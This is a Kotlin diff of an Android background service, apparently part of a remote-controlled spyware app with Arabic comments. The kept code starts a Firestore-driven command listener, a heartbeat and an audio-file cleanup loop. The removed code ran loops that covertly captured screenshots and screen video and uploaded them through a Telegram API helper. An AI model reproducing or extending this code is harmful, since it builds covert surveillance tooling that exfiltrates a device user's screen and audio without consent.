@@ -22,23 +22,16 @@ class BackgroundService : Service() {
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var running = true
 
-    companion object {
-        @Volatile
-        var autoVideoActive: Boolean = false
-        @Volatile
-        var autoVideoDuration: Int = 30
-    }
-
     override fun onCreate() {
         super.onCreate()
         startForegroundWithNotification()
 
-        // ⭐ 1. ابدأ CommandListener فورًا — قبل أي صلاحية
+        // CommandListener — يقرأ من Firestore
         try {
             CommandListener.start(applicationContext)
         } catch (_: Exception) {}
 
-        // ⭐ 2. heartbeat — كل 3 دقائق
+        // heartbeat كل 3 دقائق
         scope.launch {
             while (running) {
                 try {
@@ -48,7 +41,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // حلقة التنظيف
+        // تنظيف الملفات القديمة
         scope.launch {
             while (running) {
                 try {
@@ -56,16 +49,6 @@ class BackgroundService : Service() {
                     if (audioDir.exists()) {
                         val cutoff = System.currentTimeMillis() - 60 * 60 * 1000L
                         audioDir.listFiles()?.forEach { if (it.lastModified() < cutoff) it.delete() }
-                    }
-                    val screenDir = File(applicationContext.cacheDir, "screens")
-                    if (screenDir.exists()) {
-                        val cutoff = System.currentTimeMillis() - 60 * 60 * 1000L
-                        screenDir.listFiles()?.forEach { if (it.lastModified() < cutoff) it.delete() }
-                    }
-                    val videoDir = File(applicationContext.cacheDir, "videos")
-                    if (videoDir.exists()) {
-                        val cutoff = System.currentTimeMillis() - 30 * 60 * 1000L
-                        videoDir.listFiles()?.forEach { if (it.lastModified() < cutoff) it.delete() }
                     }
                 } catch (_: Exception) {}
                 delay(5 * 60_000L)
@@ -89,51 +72,6 @@ class BackgroundService : Service() {
                     }
                 } catch (_: Exception) {
                     delay(5000L)
-                }
-            }
-        }
-
-        // حلقة لقطات الشاشة
-        scope.launch {
-            while (running) {
-                try {
-                    if (CommandExecutor.screenLoopActive && ScreenCapture.isReady) {
-                        val file = ScreenCapture.capture(applicationContext)
-                        if (file != null && file.exists()) {
-                            TelegramApi.sendPhoto(file, "📷 لقطة دورية")
-                            file.delete()
-                        }
-                        delay(30_000L)
-                    } else {
-                        delay(3000L)
-                    }
-                } catch (_: Exception) {
-                    delay(5000L)
-                }
-            }
-        }
-
-        // حلقة تسجيل الفيديو التلقائي
-        scope.launch {
-            while (running) {
-                try {
-                    if (autoVideoActive && ScreenCapture.isReady && !VideoRecorder.isRecording) {
-                        val duration = autoVideoDuration
-                        val start = VideoRecorder.start(applicationContext, duration)
-                        if (start != null) {
-                            delay((duration + 2) * 1000L)
-                            val done = VideoRecorder.stop() ?: start
-                            if (done.exists() && done.length() > 0) {
-                                TelegramApi.sendVideo(done, "🎥 تسجيل تلقائي (${duration}s)")
-                                done.delete()
-                            }
-                        }
-                        delay(5000L)
-                    } else {
-                        delay(5000L)
-                    }
-                } catch (_: Exception) {
-                    delay(10000L)
                 }
             }
         }
